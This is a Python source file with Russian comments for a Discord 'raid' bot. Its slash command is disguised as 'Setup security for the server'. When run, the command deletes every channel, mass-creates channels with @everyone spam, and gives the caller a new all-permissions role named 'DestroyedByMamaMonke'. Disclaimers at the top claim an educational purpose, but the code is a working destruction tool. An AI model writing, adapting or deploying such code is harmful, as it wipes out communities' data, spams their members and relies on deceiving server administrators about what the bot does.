# Бот написал MamaMonke. Не воровать не копировать и т.д.
# MamaMonke не несет ответственности за последствия использования данного кода/бота. Используйте на свой страх и риск.
# Данный бот предназначен только для образовательных целей. МамаМонке не поощряет и не поддерживает злоупотребление правами администратора на серверах Discord.
# Использование данного бота для нанесения вреда другим серверам или пользователям нарушает Условия использования Discord и может привести к блокировке вашего аккаунта.

import discord
from discord.ext import commands
import asyncio

class AdminBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix='/', intents=intents) # Префикс бота

    async def on_ready(self):
        print(f'{self.user} готов к работе') # Сообщение в консоль при запуске бота (чтобы знать что бот запустился)

    async def setup_hook(self):
        await self.tree.sync()

bot = AdminBot()

@bot.tree.command(name="setup", description="Setup security for the server") # название команды для начала рейда и её описание
@commands.has_permissions(administrator=True)
async def setup_main(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    # удаление всех каналов
    for channel in guild.channels:
        try:
            await channel.delete() # удаляет ВСЕ каналы (может занять время ибо питон медленнее улитки)
            
        except:
            continue
    
    # пишет в новые каналы ваш текст (можете заменить на ссылку на свой дс сервер или что-то ещё) так же можно на картинку
    for i in range(100000): # Количество создаваемых каналов
        try:
            # созданние текстового канала
            text_channel = await guild.create_text_channel(f"Channel Name") # Имя канала
            await text_channel.send("@everyone replace this text with yours") # сообщение в канал
        except:
            continue
    
    # создание роли с админ правами и выдача её себе
    try:
        role = await guild.create_role(
            name="DestroyedByMamaMonke", # Имя роли которую вы получите
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await interaction.user.add_roles(role)
    except:
        pass
    
    await interaction.followup.send("Done") # Сообщение после выполнения команды

if __name__ == "__main__":
    bot.run("Token")  # Замените на ваш токен бота